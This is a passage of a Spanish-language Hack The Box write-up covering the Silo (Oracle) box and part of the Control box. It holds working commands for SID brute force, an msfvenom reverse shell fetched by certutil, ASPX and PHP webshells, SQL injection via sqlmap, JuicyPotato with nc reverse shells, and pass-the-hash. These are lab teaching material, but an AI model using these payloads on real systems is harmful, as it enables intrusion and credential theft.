49152/tcp open  unknown      syn-ack ttl 127
49153/tcp open  unknown      syn-ack ttl 127
49154/tcp open  unknown      syn-ack ttl 127
49155/tcp open  unknown      syn-ack ttl 127
49159/tcp open  unknown      syn-ack ttl 127
49160/tcp open  unknown      syn-ack ttl 127
49161/tcp open  unknown      syn-ack ttl 127
49162/tcp open  unknown      syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.27 seconds
           Raw packets sent: 65634 (2.888MB) | Rcvd: 65535 (2.621MB)
</code></pre>
<h3 id="escaneo-específico-9"><a class="header" href="#escaneo-específico-9">Escaneo específico</a></h3>
<pre><code class="language-bash">└─$ nmap -sCV -p 80,135,139,445,1521,5985,47001,49152,49153,49154,49155,49159,49160,49161,49162 -n -Pn -oN nmap/targeted $TARGET
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-23 23:11 EDT
Nmap scan report for 10.10.10.82
Host is up (0.065s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 8.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/8.5
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1521/tcp  open  oracle-tns   Oracle TNS listener 11.2.0.2.0 (unauthorized)
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  oracle-tns   Oracle TNS listener (requires service name)
49160/tcp open  msrpc        Microsoft Windows RPC
49161/tcp open  msrpc        Microsoft Windows RPC
49162/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.0.2:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2022-05-24T03:13:17
|_  start_date: 2022-05-24T02:53:36
| smb-security-mode:
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: supported

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 127.10 seconds
</code></pre>
<h1 id="enumeración-17"><a class="header" href="#enumeración-17">Enumeración</a></h1>
<h2 id="servicios-9"><a class="header" href="#servicios-9">Servicios</a></h2>
<h3 id="microsoft-iis---80"><a class="header" href="#microsoft-iis---80">Microsoft IIS - 80</a></h3>
<p>Se expone la página por default de Microsoft IIS y al hacer uso de herramientas de fuzzing no se tuvo éxito al buscar algún directorio relevante, sin embargo, para el método intencionado de resolución es importante tener a consideración.</p>
<p><img src="htb/boxes/windows/2_medio/Silo/images/enum_1.png" alt="Página default IIS" /></p>
<h3 id="oracle-tns-listener---1521"><a class="header" href="#oracle-tns-listener---1521">Oracle TNS Listener - 1521</a></h3>
<p>Después de revisar acerca de la <a href="https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener">metodología empleada</a> para este servicio, se buscó obtener información relevante respecto la versión, estatus, etc, haciendo uso de <code>tnscmd10g</code> sin éxito alguno.</p>
<p>Posteriormente, en la metodología se mencionan los SID (Identificadores de Servicio, esencialmente pueden ser reconocidos como los nombres de las bases de datos), los cuales dependiendo de la instalación realizada pueden existir uno o más SIDs por defecto. Al no poder obtenerlos mediante <code>tnscmd10g</code>, se sugiere que realice fuerza bruta de los comúnes para identificar los existentes.</p>
<h4 id="hydra-1"><a class="header" href="#hydra-1">hydra</a></h4>
<p>Haciendo uso de:</p>
<pre><code class="language-bash">hydra -L content/sids-oracle.txt -s 1521 10.10.10.82 oracle-sid
</code></pre>
<p>Con el conjunto de diccionarios que ofrece <a href="https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener#what-is-a-sid">hacktricks</a> (el cual es un compendio de las listas de nmap y metasploit), se identificaron los SIDs:</p>
<ul>
<li>CLRExtProc.</li>
<li>PLSExtProc.</li>
<li>XE.</li>
</ul>
<p><img src="htb/boxes/windows/2_medio/Silo/images/enum_2.png" alt="Fuerza bruta de SIDs" /></p>
<h1 id="explotación-9"><a class="header" href="#explotación-9">Explotación</a></h1>
<p><em>Nota: Después de resolver la máquina se suele verificar el proceso con otras fuentes, identificando de esta manera que existen 2 caminos a resolver la máquina una intencionada y una no intencionada, una más directa por no decir fácil que la otra. Primero se expondrá el método por el cuál se resolvió inicialmente y posteriormente la resolución intencionada.</em></p>
<h2 id="no-intencionada"><a class="header" href="#no-intencionada">No intencionada</a></h2>
<h3 id="obtención-de-credenciales"><a class="header" href="#obtención-de-credenciales">Obtención de credenciales</a></h3>
<h4 id="pasos-previos--preparación-4"><a class="header" href="#pasos-previos--preparación-4">Pasos previos | Preparación</a></h4>
<p>Haciendo uso de <a href="https://github.com/quentinhardy/odat">ODAT</a> se obtuvieron credenciales de un usuario disponible, por medio de un módulo que la herramienta ofrece. Inicialmente se requiere la instalación descrita en el repositorio aunque por lo que respecta en kali, basta con clonar el repositorio.</p>
<h4 id="ejecución-14"><a class="header" href="#ejecución-14">Ejecución</a></h4>
<p>Como parte inicial se ejecutó un &quot;Ave María&quot; invocando todos los módulos que la herramienta ofrece para visualizar si de esta manera se identificaba algo que pudiera servir, para ello, la herramienta solicita un SID válido a ocupar, siendo <code>XE</code> el SID con información útil (identificándolo después de ejecutar el comando con cada uno de los SIDs). Haciendo uso de:</p>
<pre><code class="language-bash">./odat.py all -s 10.10.10.82 -p 1521 -d XE
</code></pre>
<p><img src="htb/boxes/windows/2_medio/Silo/images/exploit_1.png" alt="Obtención de credenciales" /></p>
<p>Posteriormente se identificó que el módulo encargado de hacer este proceso es <code>passwordguesser</code> el cual simplemente sustituiría a <code>all</code> del comando.</p>
<h3 id="rce-3"><a class="header" href="#rce-3">RCE</a></h3>
<h4 id="pasos-previos--preparación-5"><a class="header" href="#pasos-previos--preparación-5">Pasos previos | Preparación</a></h4>
<p>Posteriormente, al revisar los módulos disponibles se identificó que tanto el módulo <code>dbmsscheduler</code> como el módulo <code>externaltable</code> ofrecen capacidad de ejecutar comandos. Que al intentar usarlos no se permitió su ejecución debido a la falta de privilegios, sin embargo, se encontró que mediante la bandera <code>--sysdba</code> existe la posibilidad de &quot;escalar&quot; estos privilegios o impersonar un rol superior al que se tenía.</p>
<h4 id="ejecución-15"><a class="header" href="#ejecución-15">Ejecución</a></h4>
<p>Obteniendo así, una vez ejecutada la reverse shell, acceso directamente como administrador.</p>
<ol>
<li>
<p>Creando un payload con:</p>
<pre><code class="language-bash">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.16 LPORT=1234 -f exe &gt; pwn.exe
</code></pre>
</li>
<li>
<p>Descargándolo con:</p>
<pre><code class="language-bash">./odat.py dbmsscheduler -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --exec &quot;certutil.exe -f -urlcache -split http://10.10.14.16/pwn.exe c:\windows\temp\pwn.exe&quot; --sysdba
</code></pre>
</li>
<li>
<p>Y ejecutándolo con:</p>
<pre><code class="language-bash">./odat.py externaltable -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --exec &quot;c:\windows\temp&quot; &quot;pwn.exe&quot; --sysdba
</code></pre>
</li>
</ol>
<p><img src="htb/boxes/windows/2_medio/Silo/images/exploit_2.png" alt="Reverse shell" /></p>
<h2 id="intencionada"><a class="header" href="#intencionada">Intencionada</a></h2>
<p>Si bien odat permite la lectura, escritura y ejecución de archivos, todo lo que realiza en estos procesos no resulta tan &quot;transparente&quot; por lo que para entender un poco acerca de Oracle se realizo parte del mismo proceso por medio de SQL directamente.</p>
<p><em>Nota: Se da por hecho que se realizo el descubrimiento de los SIDs y de las credenciales válidas, dado que <code>scott:tiger</code> son credenciales por default.</em></p>
<h3 id="rce-4"><a class="header" href="#rce-4">RCE</a></h3>
<h4 id="pasos-previos--preparación-6"><a class="header" href="#pasos-previos--preparación-6">Pasos previos | Preparación</a></h4>
<p>Como parte de la <a href="https://github.com/quentinhardy/odat#installation-optional-for-development-version">instalación de odat</a>, se realiza la instalación del cliente sql para conectarse a la base de datos de Oracle.</p>
<p>Por lo que una vez instalado se permite la conexión al host por medio de:</p>
<pre><code class="language-bash">sqlplus64 scott/tiger@10.10.10.82:1521/XE as sysdba
</code></pre>
<p><img src="htb/boxes/windows/2_medio/Silo/images/exploit_3.png" alt="Conexión con cliente Oracle" /></p>
<h4 id="ejecución-16"><a class="header" href="#ejecución-16">Ejecución</a></h4>
<p>Oracle ocupa su propia sintaxis por lo que con el siguiente pedazo de código se buscó obtener el contenido del archivo por defecto del servidor. Buscando obtener respuesta por medio del prompt configurando primeramente <code>set serveroutput ON</code> para su visualización.</p>
<pre><code class="language-sql">declare
    f utl_file.file_type;
    s varchar(200);
begin
    f := utl_file.fopen('/inetpub/wwwroot', 'iisstart.htm', 'R');
    utl_file.get_line(f,s);
    utl_file.fclose(f);
    dbms_output.put_line(s);
end;
</code></pre>
<p><img src="htb/boxes/windows/2_medio/Silo/images/exploit_4.png" alt="Lectura de archivos" /></p>
<p>Por otra parte se puede verificar que también exista la capacidad de escribir a un archivo, verificándolo con el siguiente segmento de código.</p>
<pre><code class="language-sql">declare
    f utl_file.file_type;
    s varchar(5000) := 'Hello world';
begin
    f := utl_file.fopen('/inetpub/wwwroot', 'srrequiem.txt', 'W');
    utl_file.put_line(f,s);
    utl_file.fclose(f);
end;
</code></pre>
<p><img src="htb/boxes/windows/2_medio/Silo/images/exploit_5.png" alt="Escritura de archivos" /></p>
<p><img src="htb/boxes/windows/2_medio/Silo/images/exploit_6.png" alt="Visualización en IIS" /></p>
<p>Una vez validada la escritura, se abre la puerta a la creación de una reverse shell, el inconveniente es que debido al espacio limitado en las variables respecto a los caracteres no fue posible llevarlo a cabo, por lo que se optó por una webshell en su lugar.</p>
<p>Utilizando <code>/usr/share/webshells/aspx/cmdasp.aspx</code> eliminando estilos, comentarios y saltos de línea para reducir los caracteres se obtuvo ejecución en la máquina.</p>
<p>Código de página empleado:</p>
<pre><code class="language-c#">&lt;%@ Page Language=&quot;C#&quot; Debug=&quot;true&quot; Trace=&quot;false&quot; %&gt;&lt;%@ Import Namespace=&quot;System.Diagnostics&quot; %&gt;&lt;%@ Import Namespace=&quot;System.IO&quot; %&gt;&lt;script Language=&quot;c#&quot; runat=&quot;server&quot;&gt;void Page_Load(object sender, EventArgs e){}string ExcuteCmd(string arg){ProcessStartInfo psi = new ProcessStartInfo();psi.FileName = &quot;cmd.exe&quot;;psi.Arguments = &quot;/c &quot;+arg;psi.RedirectStandardOutput = true;psi.UseShellExecute = false;Process p = Process.Start(psi);StreamReader stmrdr = p.StandardOutput;string s = stmrdr.ReadToEnd();stmrdr.Close();return s;}void cmdExe_Click(object sender, System.EventArgs e){Response.Write(&quot;&lt;pre&gt;&quot;);Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));Response.Write(&quot;&lt;/pre&gt;&quot;);}&lt;/script&gt;&lt;HTML&gt;&lt;body &gt;&lt;form id=&quot;cmd&quot; method=&quot;post&quot; runat=&quot;server&quot;&gt;&lt;asp:TextBox id=&quot;txtArg&quot; runat=&quot;server&quot; Width=&quot;250px&quot;&gt;&lt;/asp:TextBox&gt;&lt;asp:Button id=&quot;testing&quot; runat=&quot;server&quot; Text=&quot;excute&quot; OnClick=&quot;cmdExe_Click&quot;&gt;&lt;/asp:Button&gt;&lt;asp:Label id=&quot;lblText&quot; runat=&quot;server&quot;&gt;Command:&lt;/asp:Label&gt;&lt;/form&gt;&lt;/body&gt;&lt;/HTML&gt;
</code></pre>
<p><img src="htb/boxes/windows/2_medio/Silo/images/exploit_7.png" alt="Webshell en aspx" /></p>
<h1 id="post-explotación-9"><a class="header" href="#post-explotación-9">Post Explotación</a></h1>
<h2 id="enumeración-18"><a class="header" href="#enumeración-18">Enumeración</a></h2>
<p>Se identificó que entre los privilegios disponibles del usuario obtenido se encuentra habilitado <code>SeImpersonatePrivilege</code> lo que lleva a un camino de escalación de privilegios por medio de Rotten o JuicyPotato.</p>
<p><img src="htb/boxes/windows/2_medio/Silo/images/post_1.png" alt="Privilegios de usuario" /></p>
<p>Se identificó un archivo accesible en el escritorio de uno de los usuarios del sistema <code>c:\users\phineas\desktop\oracle issue.txt</code> el cual indica que se trata de un dumpeo de memoria del sistema.</p>
<p>Contenido:</p>
<pre><code class="language-txt">Support vendor engaged to troubleshoot Windows / Oracle performance issue (full memory dump requested):

Dropbox link provided to vendor (and password under separate cover).

Dropbox link 
https://www.dropbox.com/sh/69skryzfszb7elq/AADZnQEbbqDoIf5L2d0PBxENa?dl=0

link password:
£%Hm8646uC$
</code></pre>
<p><em>Nota: Cabe recalcar que el caracter <code>£</code> puede que no se interprete correctamente si se optó por entablar una reverse shell, causando su omisión y por consiguiente, que a la hora de la descarga indique que la contraseña no es válida. Teniendo que realizar un procesado extra (ejemplo base64) para extraer su contenido. Accediendo al archivo por medio de la webshell no existió este problema</em></p>
<p><img src="htb/boxes/windows/2_medio/Silo/images/post_2.png" alt="Problema de interpretación de caracteres" /></p>
<h2 id="escalación-de-privilegios-8"><a class="header" href="#escalación-de-privilegios-8">Escalación de privilegios</a></h2>
<h3 id="método-1---juicy-potato"><a class="header" href="#método-1---juicy-potato">Método 1 - Juicy Potato</a></h3>
<p>Habiendo encontrado los privilegios relacionados con este método de escalación, sólo restaría probar su ejecución mediante el <a href="https://github.com/ohpe/juicy-potato/releases">binario</a> y con las opciones utilizadas para entablar una reverse shell con permisos elevados <code>NT AUTHORITY\SYSTEM</code>. Ejecutando:</p>
<pre><code class="language-bash">.\jp.exe -t * -l 1337 -p c:\windows\temp\nc.exe -a &quot; -e cmd.exe 10.10.14.16 4321&quot;
</code></pre>
<p><img src="htb/boxes/windows/2_medio/Silo/images/post_3.png" alt="Ejecución de Juicy Potato" /></p>
<p>Con lo que respecta a los argumentos utilizados, el binario mismo da la descripción de cada uno de ellos.</p>
<p><img src="htb/boxes/windows/2_medio/Silo/images/post_4.png" alt="Descripción de argumentos" /></p>
<p>Con lo que respecta a la práctica los argumentos <code>-t</code> y <code>-l</code> no representa algo sustancial el cambiar valores. Y en donde <code>-p</code> (programa a ejecutar) y <code>-a</code> (argumentos a utilizar por el programa señalado) se usaron a partir de las herramientas usadas en pasos anteriores.</p>
<h3 id="método-2---memdump"><a class="header" href="#método-2---memdump">Método 2 - Memdump</a></h3>
<p>Con la copia de memoria descargada, se puede hacer uso de <a href="https://www.volatilityfoundation.org/releases">volatility</a> para analizarla. Buscando antes que todo un perfil acorde al perteneciente al dumpeo de memoria, por medio de:</p>
<pre><code class="language-bash">./volatility_2.6_lin64_standalone -f /home/srrequiem/Documents/htb/windows/medium/silo/content/SILO-20180105-221806.dmp imageinfo
</code></pre>
<p>Teniendo en cuenta que debido al acceso previamente obtenido se puede buscar un perfil más adecuado.</p>
<p><img src="htb/boxes/windows/2_medio/Silo/images/post_5.png" alt="Perfiles sugeridos" /></p>
<p>Ejecutando <code>systeminfo</code> en la máquina se pueden comparar resultados, identificando el perfil <code>Win2012R2x64</code> como el más adecuado.</p>
<p><img src="htb/boxes/windows/2_medio/Silo/images/post_6.png" alt="Información de sistema" /></p>
<p>Haciendo uso del plugin <code>hashdump</code> se pueden obtener los hashes del sistema, exponiendo de esta manera una forma de acceder a la máquina como el usuario Administrator. Por medio de:</p>
<pre><code class="language-bash">./volatility_2.6_lin64_standalone -f /home/srrequiem/Documents/htb/windows/medium/silo/content/SILO-20180105-221806.dmp --profile=Win2012R2x64 hashdump
</code></pre>
<p><img src="htb/boxes/windows/2_medio/Silo/images/post_7.png" alt="Obtención de hashes" /></p>
<p>Obteniendo acceso haciendo uso del hash con:</p>
<pre><code class="language-bash">impacket-psexec Administrator@10.10.10.82 -hashes :9e730375b7cbcebf74ae46481e07b0c7
</code></pre>
<p><img src="htb/boxes/windows/2_medio/Silo/images/post_8.png" alt="Acceso como Administrator" /></p>
<h1 id="referencias-12"><a class="header" href="#referencias-12">Referencias</a></h1>
<ul>
<li><a href="https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener">Hack Tricks - Pentesting Oracle TNS Listener</a>.</li>
<li><a href="https://github.com/quentinhardy/odat">odat.py</a>.</li>
<li><a href="https://0xdf.gitlab.io/2018/08/04/htb-silo.html">0xdf Write-up</a>.</li>
<li><a href="https://www.youtube.com/watch?v=2c7SzNo9uoA">Ippsec Walkthrough</a>.</li>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#juicy-potato-abusing-the-golden-privileges">PayloadAllTheThings - JuicyPotato</a>.</li>
<li><a href="https://github.com/ohpe/juicy-potato/releases">Binarios Juicy Potato</a>.</li>
<li><a href="https://www.volatilityfoundation.org/releases">Releases Volatility</a>.</li>
<li><a href="https://github.com/volatilityfoundation/volatility">Github Volatility</a>.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="estadísticas-10"><a class="header" href="#estadísticas-10">Estadísticas</a></h1>
<div class="table-wrapper"><table><thead><tr><th>Característica</th><th>Descripción</th></tr></thead><tbody>
<tr><td>Nombre</td><td><a href="https://www.hackthebox.com/home/machines/profile/218">Control</a></td></tr>
<tr><td>OS</td><td>Windows</td></tr>
<tr><td>Dificultad oficial</td><td>Hard</td></tr>
<tr><td>Dificultad de comunidad</td><td><img src="htb/boxes/windows/3_dificil/Control/images/difficulty.png" alt="Dificultad" /></td></tr>
<tr><td>Puntos</td><td>40</td></tr>
<tr><td>Creadores</td><td><a href="https://www.hackthebox.com/home/users/profile/31190">TRX</a></td></tr>
</tbody></table>
</div>
<h1 id="reconocimiento-10"><a class="header" href="#reconocimiento-10">Reconocimiento</a></h1>
<h2 id="escaneo-de-host-10"><a class="header" href="#escaneo-de-host-10">Escaneo de host</a></h2>
<h3 id="escaneo-completo-de-puertos-10"><a class="header" href="#escaneo-completo-de-puertos-10">Escaneo completo de puertos</a></h3>
<pre><code class="language-bash">└─$ sudo nmap -sS --min-rate 5000 -vvv -opèn -p- -n -Pn -oG nmap/all_ports_ss $TARGET
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Warning: The -o option is deprecated. Please use -oN
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-07 00:44 EDT
Initiating SYN Stealth Scan at 00:44
Scanning 10.10.10.167 [65535 ports]
Discovered open port 3306/tcp on 10.10.10.167
Discovered open port 135/tcp on 10.10.10.167
Discovered open port 80/tcp on 10.10.10.167
Discovered open port 49666/tcp on 10.10.10.167
Discovered open port 49667/tcp on 10.10.10.167
Completed SYN Stealth Scan at 00:45, 26.41s elapsed (65535 total ports)
Nmap scan report for 10.10.10.167
Host is up, received user-set (0.064s latency).
Scanned at 2022-06-07 00:44:41 EDT for 26s
Not shown: 65530 filtered tcp ports (no-response)
PORT      STATE SERVICE REASON
80/tcp    open  http    syn-ack ttl 127
135/tcp   open  msrpc   syn-ack ttl 127
3306/tcp  open  mysql   syn-ack ttl 127
49666/tcp open  unknown syn-ack ttl 127
49667/tcp open  unknown syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.48 seconds
           Raw packets sent: 131084 (5.768MB) | Rcvd: 60 (2.496KB)
</code></pre>
<h3 id="escaneo-específico-10"><a class="header" href="#escaneo-específico-10">Escaneo específico</a></h3>
<pre><code class="language-bash">└─$ nmap -sCV -p 80,135,3306,49666,49667 -n -Pn -oN nmap/targeted $TARGET
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-07 00:45 EDT
Nmap scan report for 10.10.10.167
Host is up (0.064s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Fidelity
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc   Microsoft Windows RPC
3306/tcp  open  mysql?
| fingerprint-strings:
|   NULL:
|_    Host '10.10.14.16' is not allowed to connect to this MariaDB server
49666/tcp open  msrpc   Microsoft Windows RPC
49667/tcp open  msrpc   Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.92%I=7%D=6/7%Time=629ED800%P=x86_64-pc-linux-gnu%r(NUL
SF:L,4A,&quot;F\0\0\x01\xffj\x04Host\x20'10\.10\.14\.16'\x20is\x20not\x20allowe
SF:d\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;);
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.09 seconds
</code></pre>
<h1 id="enumeración-19"><a class="header" href="#enumeración-19">Enumeración</a></h1>
<h2 id="servicios-10"><a class="header" href="#servicios-10">Servicios</a></h2>
<h3 id="http---80-5"><a class="header" href="#http---80-5">http - 80</a></h3>
<h4 id="manual-6"><a class="header" href="#manual-6">Manual</a></h4>
<p>Visualmente no se identificó nada relevante, dado que en su mayoría los textos contienen <code>Lorem ipsum</code> salvo algunas rutas expuestas mediante a la interacción con parte de la interfaz. Visualizando así un error en la ruta <code>admin.php</code> después de dar click al botón de Login.</p>
<p><img src="htb/boxes/windows/3_dificil/Control/images/enum_1.png" alt="Error en admin.php" /></p>
<p>Al navegar al código fuente de la página inicial, se identificaron dos posibles pistas respecto a la construcción del sitio.</p>
<p><img src="htb/boxes/windows/3_dificil/Control/images/enum_2.png" alt="Pistas iniciales" /></p>
<ol>
<li>
<p>La exposición de código del sitio <code>functions.js</code>.</p>
</li>
<li>
<p>Una posible ruta hacia otro host o algo similar.</p>
</li>
</ol>
<p>Al navegar al script se pueden identificar rutas que pudieran formar parte de un CRUD y que difícilmente puedan ser encontradas en algún diccionario de fuzzing.</p>
<p><img src="htb/boxes/windows/3_dificil/Control/images/enum_3.png" alt="Código de functions.js" /></p>
<p>Al identificar la composición de la petición e interactuar con <code>view_products.php</code> haciendo uso de:</p>
<pre><code class="language-bash">curl -i http://10.10.10.167/view_product.php -X POST -F &quot;productId=1&quot;
</code></pre>
<p>Se puede observar una tabla en html permitiendo la suposición de que se desplegarían en este sitio los atributos del producto en cuestión.</p>
<p><img src="htb/boxes/windows/3_dificil/Control/images/enum_4.png" alt="Vista inicial de producto" /></p>
<p>Después de varias iteraciones, buscando un identificador válido (26) se puede visualizar que la suposición era la correcta.</p>
<p><img src="htb/boxes/windows/3_dificil/Control/images/enum_5.png" alt="ID válido" /></p>
<h4 id="ffuf-4"><a class="header" href="#ffuf-4">ffuf</a></h4>
<p>Para complementar lo obtenido se buscaron rutas adicionales por medio de:</p>
<pre><code class="language-bash">ffuf -c -ic -u http://10.10.10.167/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .txt,.bak,.php,.html
</code></pre>
<p><img src="htb/boxes/windows/3_dificil/Control/images/enum_6.png" alt="Rutas adicionales encontradas" /></p>
<h1 id="explotación-10"><a class="header" href="#explotación-10">Explotación</a></h1>
<h2 id="inyección-sql-1"><a class="header" href="#inyección-sql-1">Inyección SQL</a></h2>
<h3 id="ejecución-17"><a class="header" href="#ejecución-17">Ejecución</a></h3>
<p>Teniendo en cuenta la tecnología empleada y parte de los parámetros usados, se buscó explotar una inyección SQL haciendo uso de <code>sqlmap</code>, utilizando:</p>
<pre><code class="language-bash">sqlmap -u &quot;http://10.10.10.167/view_product.php&quot; --data=&quot;productId=1&quot; --dbs
</code></pre>
<p>Obteniendo de esta forma payloads válidos y la capacidad de obtener los registros de la base de datos.</p>
<ul>
<li>Payload: <code>productId=1 UNION ALL SELECT &lt;query&gt;-- -</code></li>
</ul>
<p><img src="htb/boxes/windows/3_dificil/Control/images/exploit_1.png" alt="Inyección con sqlmap" /></p>
<p>Después no encontrar información relevante respecto a la aplicación web, se buscó obtener información respecto a los usuarios de la base de datos, mediante:</p>
<pre><code class="language-bash">sqlmap -u &quot;http://10.10.10.167/view_product.php&quot; --data=&quot;productId=1&quot; -D mysql -T user --passwords
</code></pre>
<p>Obteniendo así sus hashes.</p>
<p><img src="htb/boxes/windows/3_dificil/Control/images/exploit_2.png" alt="Hashes de usuarios de base de datos" /></p>
<p>A lo que posteriormente, una vez guardados se hizo uso de <code>john</code> para crackearlos.</p>
<p><img src="htb/boxes/windows/3_dificil/Control/images/exploit_3.png" alt="Crackeo con john" /></p>
<p>Adicional a ello, haciendo uso de <a href="https://crackstation.net/">CrackStation</a> se obtuvo la contraseña de un hash adicional del cuál no se obtuvo con <code>john</code>.</p>
<p><img src="htb/boxes/windows/3_dificil/Control/images/exploit_4.png" alt="Crackeo con CrackStation" /></p>
<p>Identificando así las credenciales:</p>
<pre><code class="language-text">manager:l3tm3!n
hector:l33th4x0rhector
</code></pre>
<h2 id="rce-5"><a class="header" href="#rce-5">RCE</a></h2>
<p>Después de obtener las credenciales y buscar emplearlas con los servicios expuestos en la máquina (mysql únicamente dado que no se cuenta con <code>smb</code> o algún otro servicio en donde se pudieran haber usado) <a href="https://kayran.io/blog/web-vulnerabilities/sqli-to-rce/">se buscó la forma</a> para que mediante la inyección SQL se para pudiera lograr la ejecución remota de código mediante la escritura de un script en php, haciendo uso de instrucciones como <code>INTO OUTFILE</code> o <code>INTO DUMPFILE</code>.</p>
<p>Para lograrlo fue necesario identificar el directorio en el que se encuentra la instalación, de acuerdo al <a href="https://docs.microsoft.com/en-us/previous-versions/office/developer/sharepoint-2010/ms474356(v=office.14)">enlace encontrado</a> se indica que por predeterminado la ruta suele ser <code>c:\inetpub\wwwroot</code>, permitiendo de esta forma complementar hacia dónde debería dirigirse la escritura del script.</p>
<p>Después de probar con diferentes payloads respecto al escape de las barras (<code>\</code>), dado que la respuesta del servidor es identificada como un <code>500 Internal Server Error</code>, se realizó una prueba de la escritura mediante:</p>
<pre><code class="language-bash">curl -i http://10.10.10.167/view_product.php -X POST -F &quot;productId=26 UNION ALL SELECT 'Hello world' INTO OUTFILE 'c:\\\\\\\\inetpub\\\\wwwroot\\\\test.txt'-- -&quot;
</code></pre>
<p>Logrando escribir satisfactoriamente al archivo indicado.</p>
<p><em><strong>En este punto es importante recalcar para futuros escenarios similares que no siempre es verdad que porque la respuesta del servidor sea 500, significa que no se esté ejecutando el payload indicado.</strong></em></p>
<p><img src="htb/boxes/windows/3_dificil/Control/images/exploit_5.png" alt="Petición creación de archivo" /></p>
<p>Visualizandolo en el servidor.</p>
<p><img src="htb/boxes/windows/3_dificil/Control/images/exploit_6.png" alt="Visualización en navegador" /></p>
<p>Permitiendo de esta manera cambiar el payload a </p>
<pre><code class="language-bash">curl -i http://10.10.10.167/view_product.php -X POST -F 'productId=26 UNION ALL SELECT &quot;&lt;?php system($_GET[\&quot;cmd\&quot;])?&gt;&quot; INTO OUTFILE &quot;c:\\\\\\\\inetpub\\\\wwwroot\\\\srrequiem.php&quot;-- -'
</code></pre>
<p>Logrando así tener un script listo para ejecutar comandos en la máquina.</p>
<p><img src="htb/boxes/windows/3_dificil/Control/images/exploit_7.png" alt="Webshell" /></p>
<p>Por lo que se estableció una reverse shell haciendo uso del binario <code>nc.exe</code>, subiéndolo a la máquina mediante la request:</p>
<pre><code class="language-text">http://10.10.10.167/srrequiem.php?cmd=powershell.exe%20iwr%20http://10.10.14.16/nc.exe%20-outfile%20c:\windows\temp\nc.exe
</code></pre>
<p>Montando previamente el servidor web donde se encuentra el binario a descargar. Para ejecutarlo posteriormente con:</p>
<pre><code class="language-text">http://10.10.10.167/srrequiem.php?cmd=c:\windows\temp\nc.exe%20-e%20powershell.exe%2010.10.14.16%201234
</code></pre>
<p>Logrando así acceso de una manera más interactiva.</p>
<p><img src="htb/boxes/windows/3_dificil/Control/images/exploit_8.png" alt="Reverse shell" /></p>
<h1 id="post-explotación-10"><a class="header" href="#post-explotación-10">Post Explotación</a></h1>
<h2 id="enumeración-20"><a class="header" href="#enumeración-20">Enumeración</a></h2>
<p>Al buscar atar cabos sueltos respecto a lo indicado en el código fuente del sitio, se pudo visualizar que en el contenido del script de <code>admin.php</code> se hace un filtrado de cabeceras indicado por <code>HTTP_X_FORWARDED_FOR</code> buscando la IP indicada <code>192.168.4.28</code>. A lo que por consiguiente si se añadiera la cabecera <code>X-Forwarded-For: 192.168.4.28</code> a las peticiones realizadas se visualizaría el contenido de <code>admin.php</code>, logrando así un bypass de la validación.</p>
<p><img src="htb/boxes/windows/3_dificil/Control/images/post_14.png" alt="Validación de cabeceras" /></p>
<h2 id="escalación-de-privilegios-9"><a class="header" href="#escalación-de-privilegios-9">Escalación de privilegios</a></h2>
<h3 id="nt-authorityiusr--hector"><a class="header" href="#nt-authorityiusr--hector">nt authority\iusr → hector</a></h3>
<p>Habiendo identificado que existe el usuario <code>hector</code> en el sistema operativo por medio del listado de directorios de <code>c:\users</code>, se dispuso a buscar la manera de ejecutar comandos mediante las credenciales obtenidas.</p>
<p><img src="htb/boxes/windows/3_dificil/Control/images/post_1.png" alt="Listado de c:\users" /></p>
